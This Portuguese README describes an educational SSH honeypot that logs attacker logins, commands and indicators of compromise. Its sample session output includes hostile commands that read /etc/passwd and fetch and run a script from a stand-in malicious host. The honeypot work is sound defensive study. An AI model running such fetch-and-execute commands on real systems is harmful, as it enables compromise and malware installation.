# SSH Honeypot - Sistema de Detecção de Ataques

## Descrição
Honeypot SSH que simula um servidor SSH vulnerável para coletar informações sobre atacantes, técnicas de ataque e credenciais utilizadas. Registra todas as tentativas de acesso, comandos executados e comportamento dos atacantes.

## Objetivos de Aprendizado
- Conceitos de honeypots e threat intelligence
- Análise de comportamento de atacantes
- Coleta de IOCs (Indicators of Compromise)
- Técnicas de defesa proativa

## Tecnologias
- Python 3.8+
- Paramiko (SSH)
- SQLite (armazenamento)
- GeoIP2 (geolocalização)

## Funcionalidades
- Simula servidor SSH em porta customizável
- Registra tentativas de login (brute force)
- Captura comandos executados pelos atacantes
- Geolocalização de IPs atacantes
- Emula sistema de arquivos falso
- Coleta de IOCs (IPs, usuários, senhas, malware)
- Dashboard de estatísticas
- Exportação de dados para threat intelligence

## Instalação

```bash
git clone https://github.com/444dex/cybersecurity-blue-team-portfolio.git
cd ssh-honeypot

python -m venv venv
source venv/bin/activate

pip install -r requirements.txt

# Gerar chave SSH para o honeypot
ssh-keygen -t rsa -f honeypot_key -N ""
```

## Uso

```bash
# Executar honeypot na porta 2222
sudo python ssh_honeypot.py --port 2222

# Com geolocalização
python ssh_honeypot.py --port 2222 --geoip

# Visualizar estatísticas
python stats_dashboard.py

# Exportar dados
python export_data.py --format json --output attacks.json
```

## Estrutura do Projeto
```
ssh-honeypot/
├── ssh_honeypot.py      # Servidor honeypot
├── fake_shell.py        # Shell emulado
├── database.py          # Gerenciamento SQLite
├── stats_dashboard.py   # Dashboard de estatísticas
├── export_data.py       # Exportação de dados
├── honeypot.db          # Banco de dados
├── logs/
│   └── honeypot.log
└── requirements.txt
```

## Dados Coletados

### Tentativas de Login
- IP de origem
- Porta de origem
- Usuário tentado
- Senha tentada
- Timestamp
- Geolocalização (país, cidade)
- Sucesso/Falha

### Sessões
- IP do atacante
- Duração da sessão
- Comandos executados
- Arquivos baixados/enviados
- Tentativas de escalação de privilégio

### Estatísticas
- Top 10 IPs atacantes
- Top 10 usuários mais tentados
- Top 10 senhas mais usadas
- Distribuição geográfica
- Horários de maior atividade
- Comandos mais executados

## Exemplo de Output

```bash
[*] SSH Honeypot iniciado na porta 2222
[*] Aguardando conexões...

[2025-01-30 14:23:45] Nova conexão de 45.142.212.61:54321
[2025-01-30 14:23:46] Tentativa de login:
  - Usuário: root
  - Senha: admin123
  - País: Russia (RU)
  - Resultado: FALHOU

[2025-01-30 14:23:47] Tentativa de login:
  - Usuário: admin
  - Senha: password
  - País: Russia (RU)
  - Resultado: SUCESSO (fake)

[2025-01-30 14:23:48] Sessão iniciada - Comandos:
  > whoami
  > uname -a
  > cat /etc/passwd
  > wget http://malicious.com/bot.sh
  > chmod +x bot.sh
  > ./bot.sh

[2025-01-30 14:24:15] Sessão encerrada
  - Duração: 27 segundos
  - Comandos executados: 6
  - IOCs coletados: 1 URL maliciosa
```

## Dashboard de Estatísticas

```
╔═══════════════════════════════════════════════╗
║        SSH HONEYPOT - ESTATÍSTICAS            ║
╠═══════════════════════════════════════════════╣
║ Total de tentativas de login: 1,247          ║
║ IPs únicos: 89                                ║
║ Sessões estabelecidas: 23                     ║
║ Comandos capturados: 156                      ║
╠═══════════════════════════════════════════════╣
║ TOP 5 IPs ATACANTES                           ║
╠═══════════════════════════════════════════════╣
║ 1. 45.142.212.61 (RU) - 234 tentativas       ║
║ 2. 103.212.91.45 (CN) - 187 tentativas       ║
║ 3. 185.220.101.23 (NL) - 156 tentativas      ║
║ 4. 91.201.67.89 (UA) - 143 tentativas        ║
║ 5. 117.18.232.200 (IN) - 128 tentativas      ║
╠═══════════════════════════════════════════════╣
║ TOP 5 SENHAS MAIS USADAS                      ║
╠═══════════════════════════════════════════════╣
║ 1. admin - 456 vezes                          ║
║ 2. 123456 - 398 vezes                         ║
║ 3. password - 287 vezes                       ║
║ 4. root - 234 vezes                           ║
║ 5. 12345678 - 198 vezes                       ║
╚═══════════════════════════════════════════════╝
```

## Aprendizados
- Como honeypots funcionam
- Padrões de comportamento de atacantes
- Técnicas de ataque SSH comuns
- Coleta de threat intelligence
- Análise de IOCs

## Considerações de Segurança
- Execute em rede isolada ou VM
- Não exponha à internet sem proteção adequada
- Monitore recursos do sistema
- Tenha backups regulares do banco de dados

## Recursos
- [The Honeynet Project](https://www.honeynet.org/)
- [SANS - Honeypots](https://www.sans.org/white-papers/)

## Licença
MIT License - Apenas para fins educacionais
